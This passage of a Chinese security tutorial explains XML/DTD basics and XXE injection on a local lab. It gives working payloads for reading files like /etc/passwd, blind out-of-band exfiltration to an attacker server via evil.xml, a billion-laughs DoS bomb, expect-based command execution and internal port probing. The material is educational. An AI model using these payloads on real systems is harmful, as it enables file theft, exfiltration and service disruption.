class="hljs-keyword">XML</span> <span class="hljs-title">的属性值须加引号。</span><br></code></pre></td></tr></table></figure><p><strong>结构：</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>.<span class="hljs-keyword">XML</span> <span class="hljs-title">文档声明，在文档的第一行</span><br><span class="hljs-title">2</span>.<span class="hljs-keyword">XML</span> <span class="hljs-title">文档类型定义，即DTD</span>，XXE 漏洞所在的地方<br><span class="hljs-number">3</span>.<span class="hljs-keyword">XML</span> <span class="hljs-title">文档元素</span><br></code></pre></td></tr></table></figure><p>如：<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220937893.png" alt="图片"></p><p><strong>实体引用：</strong><br>在 XML 中一些字符拥有特殊的意义，如果把字符 <code>&lt;</code> 放在 XML 元素中，便会发生错误，这是因为解析器会把它当作新元素的开始。<br>例如:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>hello &lt; world<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><p>便会报错，为了避免这些错误，可以实体引用来代替 <code>&lt;</code> 字符</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>hello <span class="hljs-symbol">&amp;lt;</span> world<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>XML</code> 中，有 5 个预定义的实体引用，分别为：<br><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220938665.png" alt="图片"><br>上面提到XML 文档类型定义，即DTD，XXE 漏洞所在的地方，为什么这个地方会产生XXE漏洞那，不要着急，先来了解一下DTD。</p><h4 id="0x02-了解DTD："><a href="#0x02-了解DTD：" class="headerlink" title="0x02 了解DTD："></a>0x02 了解DTD：</h4><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><p><strong>优点：</strong></p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso">有了DTD，每个<span class="hljs-built_in">XML</span>文件可以携带一个自身格式的描述。<br>有了DTD，不同组织的人可以使用一个通用DTD来交换数据。<br></code></pre></td></tr></table></figure><p><strong>DTD文档的三种应用形式：</strong></p><p><strong>1.内部DTD文档</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!DOCTYPE 根元素[定义内容]&gt;<br></code></pre></td></tr></table></figure><p><strong>2.外部DTD文档</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;<br></code></pre></td></tr></table></figure><p><strong>3.内外部DTD文档结合</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt;<br></code></pre></td></tr></table></figure><p>例如：<br>上半部分是<strong>内部DTD文档</strong>，下半部分是XML文档<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220939026.png" alt="图片"></p><p><code>#PCDATA（Parsed Character Data）</code> ，代表的是可解析的字符数据，即字符串</p><p>下面再举一个<strong>外部DTD文档</strong>的例子：<br>新建一个DTD文档，文件名叫<code>LOL.dtd</code>，内容如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!ELEMENT game (lol, dota, dnf)&gt;<br>&lt;!ELEMENT lol (#PCDATA)&gt;<br>&lt;!ELEMENT dota (#PCDATA)&gt;<br>&lt;!ELEMENT dnf (#PCDATA)&gt;<br></code></pre></td></tr></table></figure><p>再新建一个XML文档，加入外部DTD文件的名称（同一个路径下只给出文件名即可）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE game SYSTEM &quot;LOL.dtd&quot;&gt;<br>&lt;game&gt;<br>    &lt;lol&gt;a&lt;/lol&gt;<br>    &lt;dota&gt;b&lt;/dota&gt;<br>    &lt;dnf&gt;c&lt;/dnf&gt;<br>&lt;/game&gt;<br></code></pre></td></tr></table></figure><p>具体例子可以参考<br>有效的XML: DTD（文档类型定义）介绍</p><p>DTD元素</p><p>在一个 DTD 中，元素通过元素声明来进行声明。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220940137.png" alt="图片"></p><p>其中可以看到一些PCDATA或是CDATA，这里简单叙述一下：</p><p><strong>PCDATA：</strong></p><p><code>PCDATA</code> 的意思是被解析的字符数据<code>（parsed character data）</code>。可以把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。<code>PCDATA</code> 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。但是，被解析的字符数据不应当包含任何 <code>&amp; &lt; &gt;</code> 字符；需要使用 <code>&amp; &lt; &gt;</code> 实体来分别替换它们。</p><p><strong>CDATA：</strong><br><code>CDATA</code> 的意思是字符数据<code>（character data）</code>。<code>CDATA</code> 是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><p>简单比较直观的就是这样的一种解释：<br><code>PCDATA</code>表示已解析的字符数据。<br><code>CDATA</code>是不通过解析器进行解析的文本，文本中的标签不被看作标记。CDATA表示里面是什么数据XML都不会解析</p><p><strong>DTD-实体</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">实体是用于定义引用普通文本或特殊字符的快捷方式的变量。<br>实体引用是对实体的引用。<br>实体可在内部或外部进行声明。<br></code></pre></td></tr></table></figure><p><strong>内部实体</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;<br></code></pre></td></tr></table></figure><p>一个实体由三部分构成: <code>&amp;</code>符号, 一个实体名称, 以及一个分号 <code>(;)</code><br>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe &quot;hello&quot;&gt;]&gt;<br>&lt;foo&gt;&amp;xxe;&lt;/foo&gt;<br></code></pre></td></tr></table></figure><p><strong>外部实体</strong></p><p><code>XML</code>中对数据的引用称为实体，实体中有一类叫外部实体，用来引入外部资源，有<code>SYSTEM</code>和<code>PUBLIC</code>两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以利用如下协议</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/path/</span>to/file.ext<br>http:<span class="hljs-regexp">//u</span>rl/file.ext<br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=conf.php<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220943791.png" alt="图片"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;URL&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>参数实体</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY %实体名称 <span class="hljs-string">&quot;值&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY %实体名称 <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;URL&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;<br>%xxe;]&gt;<br>&lt;foo&gt;&amp;evil;&lt;/foo&gt;<br></code></pre></td></tr></table></figure><p>外部<code>evil.dtd</code>中的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY evil SYSTEM “file:///c:/windows/win.ini” &gt;<br></code></pre></td></tr></table></figure><p><strong>外部实体</strong>可支持<code>http</code>、<code>file</code>等协议，所以就有可能通过引用外部实体进行远程文件读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE xdsec [<br>&lt;!ELEMENT methodname ANY &gt;<br>&lt;!ENTITY xxe(实体引用名) SYSTEM &quot;file:///etc/passwd&quot;(实体内容) &gt;]&gt;<br>&lt;methodcall&gt;<br>&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;<br>&lt;/methodcall&gt;<br></code></pre></td></tr></table></figure><p>上述代码中，XML的外部实体<code>xxe</code>被赋予的值为<code>：file:///etc/passwd</code>当解析xml文档是，<code>&amp;xxe;</code>会被替换为<code>file:///ect/passwd</code>的内容，导致敏感信息泄露</p><p>可能这些知识点会枯燥无味，但<code>XXE</code>主要是利用了<code>DTD引用外部实体</code>而导致的漏洞，所以了解还是很有必要的,接下来就要进入正题咯。</p><h4 id="0x03-一步一步接近XXE漏洞"><a href="#0x03-一步一步接近XXE漏洞" class="headerlink" title="0x03:一步一步接近XXE漏洞"></a>0x03:一步一步接近XXE漏洞</h4><p>&#x3D;&#x3D;漏洞危害：&#x3D;&#x3D;</p><p>如果开发人员在开发时<strong>允许引用外部实体</strong>时，恶意用户便会利用这一漏洞构造恶意语句，从而引发<strong>文件读取</strong>、<strong>命令执行</strong>、<strong>内网端口扫描</strong>、<strong>攻击内网网站</strong>、<strong>发起dos攻击</strong>等，可见其危害之大。</p><p>&#x3D;&#x3D;XXE常见的几种攻击方式&#x3D;&#x3D;<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220950526.png" alt="图片"></p><p><strong>（这张图其实就很好的解释了如何利用XXE进行攻击）</strong></p><p><code>XXE</code>和<code>SQL</code>注入的攻击方法也有一点相似，就是有<strong>回显和没有回显</strong></p><p>有回显的情况可以直接在页面中看到<code>payload</code>的执行结果或现象，无回显的情况又称为<code>blind xxe</code>（类似于布尔盲注、时间盲注），可以使用外带数据(OOB)通道提取数据</p><h4 id="下面就通过构造一些简单的php环境来了解一下各个攻击方法究竟是如何利用的"><a href="#下面就通过构造一些简单的php环境来了解一下各个攻击方法究竟是如何利用的" class="headerlink" title="下面就通过构造一些简单的php环境来了解一下各个攻击方法究竟是如何利用的"></a>下面就通过构造一些简单的php环境来了解一下各个攻击方法究竟是如何利用的</h4><h4 id="一、读取任意文件（有回显与无回显）"><a href="#一、读取任意文件（有回显与无回显）" class="headerlink" title="一、读取任意文件（有回显与无回显）"></a>一、读取任意文件（有回显与无回显）</h4><p>测试源码：</p><p><strong>测试源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$xml</span>=<span class="hljs-title function_ invoke__">simplexml_load_string</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xml&#x27;</span>]);<br><span class="hljs-title function_ invoke__">print_r</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$xml</span>);<span class="hljs-comment">//有回显</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>构造payload：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> enyoucoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///D://1.txt&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>将payload进行<strong>url编码</strong>，传入即可读取任意文件</p><p>将payload进行<strong>url编码</strong>，传入即可读取任意文件</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220953320.png" alt="图片"></p><p>根据结果我们可以看到通过构造<strong>内部实体的payload</strong>,在 <code>xml</code> 中 <code>&amp;file ;</code> 已经变成了外部文件<code>1.txt</code>中内容，导致敏感信息泄露。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220953729.png" alt="图片"></p><p>下面通过靶场来进行练习<strong>有回显读取文件和无回显读取文件</strong>，抓包发现通过XML进行传输数据</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220954977.png" alt="图片">发现响应包的内容为<code>usrename</code><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220954632.png" alt="图片"></p><p>构造payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hack</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span>  <span class="hljs-string">&quot;file:///d:/1.txt&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;test;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>hack<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220955991.png" alt="图片"></p><p>将<code>file:///d:/1.txt</code>改为<code>file:///c:/windows/win.ini</code>等其他重要文件都是可以读取的，也可以读取<code>PHP</code>文件等。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220956110.png" alt="image-20220422095628023"></p><p>解码后即是PHP代码的内容<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220956322.png" alt="图片"></p><p>上面利用<strong>内部实体</strong>和<strong>外部实体</strong>分别构造了不同的payload，而且我们发现这个靶场是有回显的，通过<strong>回显的位置</strong>我们观察到了响应包的内容，以此为依据进行构造<code>payload</code>，从而达到任意读取文件的目的。</p><p>但这种攻击方式属于传统的XXE，攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，那如果对方服务器没有回显应该如何进行注入</p><p>下面就将源码修改下，将输出代码和报错信息禁掉，改成<strong>无回显</strong><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220957431.png" alt="图片"></p><p>再次进行注入，发现已经没有回显内容<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220957728.png" alt="图片"></p><p>下面就利用这个靶场来练习<strong>无回显的文件读取</strong>,遇到无回显这种情况，可以通过<code>Blind XXE</code>方法加上外带数据通道来提取数据，先使用<code>php://filter</code>获取目标文件的内容，然后将内容以<code>http</code>请求发送到接受数据的服务器来读取数据。虽然无法直接查看文件内容，但我们仍然可以使用易受攻击的服务器作为代理，在外部网络上执行扫描以及代码。</p><p>这里我使用的攻击服务器地址为<code>192.168.59.132</code>,构造出如下payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE test[<br>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/PHPstudys/PHPTutorial/WWW/php_xxe/doLogin.php&quot;&gt;<br>&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.59.132/evil.xml&quot;&gt;<br>%dtd;<br>%send;<br>]&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221003412.png" alt="图片"></p><p><strong>evil.xml的内容如下</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.59.132/?content=%file;&#x27;&gt;&quot;&gt; %payload;<br>//%号要进行实体编码成&amp;#x25<br></code></pre></td></tr></table></figure><p><strong>evil.xml</strong>放在攻击服务器的web目录下进行访问<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221004170.png" alt="图片"></p><p>这里如果不是管理员，需要更改一下对目录的管理权限等，这里偷个懒权限全调至最高<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221004423.png" alt="图片"></p><p>至此准备工作完毕，下面就监控下<code>apache</code>的访问日志<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221004625.png" alt="图片"></p><p>请求几次，发现<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221004795.png" alt="图片"></p><p>接下来就<code>base64</code>解码即可</p><p>实验完成，但为什么那，简单的解释下:</p><p>从 <code>payload</code> 中能看到 连续调用了三个参数实体 <code>%dtd;%file;%send;</code>，这就是利用先后顺序，<code>%dtd</code> 先调用，调用后请求<strong>远程服务器(攻击服务器)<strong>上的<code>evil.xml</code>，类似于将<code>evil.xml</code>包含进来，然后再调用 <code>evil.xml</code>中的 <code>%file</code>, <code>%file</code> 就会去获取</strong>对方服务器</strong>上面的敏感文件，然后将 <code>%file</code> 的结果填入到 <code>%send</code> ，再调用 <code>%send;</code> 把我们的读取到的数据发送到我们的远程主机上，这样就实现了外带数据的效果，完美的解决了 <code>XXE</code> 无回显的问题。</p><p>无回显的构造方法也有几种固定的模板，如：</p><p><strong>一、第一种命名实体+外部实体+参数实体写法</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///c://test/1.txt&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://localhost:88/evil.xml&quot;</span>&gt;</span> </span><br><span class="hljs-meta">%dtd; %all; </span><br><span class="hljs-meta">]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-symbol">&amp;send;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>evil.xml</code>文件内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost:88%file;&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure><p><strong>二、第二种命名实体+外部实体+参数实体写法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE root [<br>&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=c:/test/1.txt&quot;&gt;<br>&lt;!ENTITY % dtd SYSTEM &quot;http://localhost:88/evil.xml&quot;&gt;<br>%dtd;<br>%send;<br>]&gt;<br>&lt;root&gt;&lt;/root&gt;<br></code></pre></td></tr></table></figure><p><code>evil.xml</code>文件内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://localhost:88/?content=%file;&#x27;&gt;&quot;&gt; %payload;<br></code></pre></td></tr></table></figure><h4 id="二、DOS攻击（Denial-of-service：拒绝服务）"><a href="#二、DOS攻击（Denial-of-service：拒绝服务）" class="headerlink" title="二、DOS攻击（Denial of service：拒绝服务）"></a><strong>二、DOS攻击（Denial of service：拒绝服务）</strong></h4><p>几乎所有可以控制服务器资源利用的东西，都可用于制造DOS攻击。通过XML外部实体注入，攻击者可以发送任意的<code>HTTP</code>请求，因为解析器会解析文档中的所有实体，所以如果实体声明层层嵌套的话，在一定数量上可以对服务器器造成<code>DoS</code>。</p><p>例如常见的XML炸弹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE lolz [<br>&lt;!ENTITY lol &quot;lol&quot;&gt;<br>&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;<br>&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;<br>&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;<br>&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;<br>&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;<br>&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;<br>&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;<br>&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;<br>]&gt;<br>&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;<br></code></pre></td></tr></table></figure><p>XML解析器尝试解析该文件时，由于DTD的定义指数级展开（即递归引用），<code>lol</code> 实体具体还有 <code>“lol”</code> 字符串，然后一个 <code>lol2</code> 实体引用了 10 次 <code>lol</code> 实体，一个 <code>lol3</code> 实体引用了 10 次 <code>lol2</code> 实体，此时一个 <code>lol3</code> 实体就含有 <code>10^2 个 “lol”</code> 了，以此类推，lol9 实体含有 <code>10^8 个 “lol”</code> 字符串,最后再引用<code>lol9</code>。所以这个1K不到的文件经过解析后会占用到<code>3G</code>的内存,可见有多恐怖，不过现代的服务器软硬件大多已经抵御了此类攻击。</p><p>防御<code>XML</code>炸弹的方法也很简单<strong>禁止DTD</strong>或者是<strong>限制每个实体的最大长度</strong>。</p><h4 id="三、命令执行"><a href="#三、命令执行" class="headerlink" title="三、命令执行"></a><strong>三、命令执行</strong></h4><p>在php环境下，xml命令执行需要php装有<code>expect</code>扩展，但该扩展默认没有安装，所以一般来说命令执行是比较难利用，但不排除有幸运的情况咯，这里就搬一下大师傅的代码以供参考：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?php <br>$xml = &lt;&lt;&lt;EOF<br>&lt;?xml version = &quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE ANY [<br>  &lt;!ENTITY f SYSTEM &quot;except://ls&quot;&gt;<br>]&gt;<br>&lt;x&gt;&amp;f;&lt;/x&gt;<br>EOF;<br>$data = simplexml_load_string($xml);<br>print_r($data);<br>?&gt;<br></code></pre></td></tr></table></figure><h4 id="四、内网探测"><a href="#四、内网探测" class="headerlink" title="四、内网探测"></a><strong>四、内网探测</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; <br>&lt;!DOCTYPE xxe [<br>&lt;!ELEMENT name ANY&gt;<br>&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot;&gt;]&gt;<br>&lt;root&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221021750.png" alt="图片"></p><p>后面的403禁止就很明显的说明了该端口是开放状态的</p><p>如果这里再尝试一下没有开放的端口，发现</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221022170.png" alt="图片">因此也可以利用这种方法来探测内网端口以及对内网进行攻击等</p><h3 id="5-4-1-XXE漏洞简介"><a href="#5-4-1-XXE漏洞简介" class="headerlink" title="5.4.1　XXE漏洞简介"></a>5.4.1　